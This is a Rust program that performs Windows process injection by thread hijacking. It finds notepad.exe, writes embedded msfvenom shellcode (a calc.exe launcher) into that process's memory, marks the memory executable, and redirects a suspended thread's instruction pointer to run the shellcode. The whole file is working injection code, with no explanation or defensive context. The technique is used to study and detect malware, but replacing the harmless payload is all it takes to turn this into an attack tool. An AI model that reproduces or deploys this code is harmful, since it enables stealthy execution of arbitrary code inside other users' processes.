use std::mem::size_of;
use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use windows::Win32::System::{
    Diagnostics::{
        Debug::{GetThreadContext, SetThreadContext, WriteProcessMemory, CONTEXT},
        ToolHelp::{
            CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
        },
    },
    Memory::{
        VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
        PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
    },
    Threading::{
        OpenProcess, OpenThread, ResumeThread, SuspendThread, WaitForSingleObject, INFINITE,
        PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
    },
};
use windows::Win32::{Foundation::HANDLE, System::Diagnostics::Debug::CONTEXT_ALL_AMD64};


// https://github.com/microsoft/win32metadata/issues/1044
#[repr(align(16))]
#[derive(Default)]
struct AlignedContext {
    ctx: CONTEXT
}

fn main() -> Result<(), String> {
    // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
    let shellcode: [u8; 276] = [
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
        0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
        0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
        0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
        0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
        0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
        0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
        0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
        0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
    ];

    println!("[+] Searching for the process handle");
    let process = find_process("notepad.exe")?;

    let hprocess = process.0;
    let pid = process.1;

    println!("[+] Searching for the thread handle");
    let hthread = find_thread(pid)?;

    let address = unsafe { 
        VirtualAllocEx(
        hprocess,
        None,
        shellcode.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    )};

    if address.is_null() {
        return Err("VirtualAllocEx failed".to_string());
    }

    println!("[+] Writing the shellcode");
    let mut return_len = 0;
    unsafe { 
        WriteProcessMemory(
            hprocess,
            address,
            shellcode.as_ptr() as _,
            shellcode.len(),
            Some(&mut return_len),
        ).unwrap_or_else(|e| {
            panic!("[!] WriteProcessMemory Failed With Error: {e}");
        })
    };

    let mut oldprotect = PAGE_PROTECTION_FLAGS(0);
    unsafe { 
        VirtualProtectEx(
            hprocess,
            address,
            shellcode.len(),
            PAGE_EXECUTE_READWRITE,
            &mut oldprotect,
        ).unwrap_or_else(|e| {
            panic!("[!] VirtualProtectEx Failed With Error: {e}");
        })
    };

    let mut ctx_thread = AlignedContext {
        ctx: CONTEXT {
            ContextFlags: CONTEXT_ALL_AMD64,
            ..Default::default()
        }
    };

    println!("[+] Stopping the thread");
    unsafe { SuspendThread(hthread); }

    println!("[+] Retrieving the thread context");
    unsafe { 
        GetThreadContext(hthread, &mut ctx_thread.ctx).unwrap_or_else(|e| {
            panic!("[!] GetThreadContext Failed With Error: {e}");
        })
    };

    ctx_thread.ctx.Rip = address as u64;

    println!("[+] Setting the thread context");
    unsafe { 
        SetThreadContext(hthread, &ctx_thread.ctx).unwrap_or_else(|e| {
            panic!("[!] SetThreadContext Failed With Error: {e}");
        })
    };

    println!("[+] Thread Executed!");
    unsafe { ResumeThread(hthread); }

    unsafe { WaitForSingleObject(hthread, INFINITE); }

    Ok(())
}

fn find_process(name: &str) -> Result<(HANDLE,u32), String> {
    let mut system = System::new_all();
    system.refresh_all();

    let processes: Vec<_> = system
        .processes()
        .values()
        .filter(|process| process.name().to_lowercase() == name)
        .collect();

    if let Some(process) = processes.into_iter().next() {
        println!("[i] Process with PID found: {}", process.pid());
        let hprocess = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, process.pid().as_u32()).expect("Error opening process!") };
        return Ok((hprocess, process.pid().as_u32()));
    }

    Err("Error finding process PID!".to_string())
}

fn find_thread(pid: u32) -> Result<HANDLE, String> {
    let snapshot =  unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0).map_err(|_| "Failed to create snapshot".to_string())? };
    let mut entry = THREADENTRY32 {
        dwSize: size_of::<THREADENTRY32>() as u32,
        ..Default::default()
    };

    if unsafe { Thread32First(snapshot, &mut entry).is_ok() } {
        loop {
            if entry.th32OwnerProcessID == pid {
                return unsafe {  OpenThread(THREAD_ALL_ACCESS, false, entry.th32ThreadID)
                    .map_err(|_| "Failed to open thread".to_string()) };
            }

            if unsafe { Thread32Next(snapshot, &mut entry).is_err() } {
                break;
            }
        }
    }
    Err("Thread not found".to_string())
}

// Example of a function to create a thread
// unsafe extern "system" fn function(_param: *mut c_void) -> u32 {
//     let a = 1 + 1;
//     return a;
// }
